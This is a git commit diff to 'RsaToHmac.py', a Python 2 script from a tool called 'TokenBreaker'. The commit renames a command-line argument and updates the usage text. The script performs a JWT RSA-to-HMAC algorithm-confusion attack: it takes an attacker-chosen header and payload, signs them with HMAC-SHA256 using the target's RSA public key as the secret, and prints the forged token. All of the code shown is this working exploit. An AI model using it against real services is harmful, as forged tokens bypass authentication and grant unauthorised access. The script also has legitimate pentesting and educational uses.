bebd5b97db90a29f9caed37ea49fd77c191a034b
goron <17004401+Goron1606@users.noreply.github.com>
2018-09-21 14:55:58 +0530

    Usage fix's

--- RsaToHmac.py
+++ RsaToHmac.py
@@ -13,7 +13,7 @@ def pad_check(data):
         data += b'='* (4 - missing_padding)
     return data
 
-def print_header(token,link):
+def print_header(token,pubkey):
     base64header=pad_check(token.split('.')[0])
     base64payload=pad_check(token.split('.')[1])
     print "Decoded Header value is : "+base64.b64decode(base64header)
@@ -22,19 +22,19 @@ def print_header(token,link):
     payload=raw_input("Enter your payload value: ")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
-    f=open(link,'r')
+    f=open(pubkey,'r')
     headerandpayload = base64header + '.' + base64payload
     finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(f.read(), msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')
     print("Successfully encoded Token: \n" + finaljwt)
 
 def main():
-    parser = argparse.ArgumentParser(description='TokenBreaker: 1.RSAtoHMAC',
-            epilog='Example Usage: \npython RsatoHMAC.py -H [JWTheader] -p [JWTPayload] -f [Publickeyfile]\n')
+    parser = argparse.ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
+            epilog='Example Usage: \npython RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]\n')
     requiredparser=parser.add_argument_group('required arguments')
     requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
-    requiredparser.add_argument('-l','--link',help="Path to Public key File",required=True)
+    requiredparser.add_argument('-p','--pubkey',help="Path to Public key File",required=True)
     args = parser.parse_args()
-    print_header(args.token,args.link)
+    print_header(args.token,args.pubkey)
 
 if __name__=='__main__':
     main()
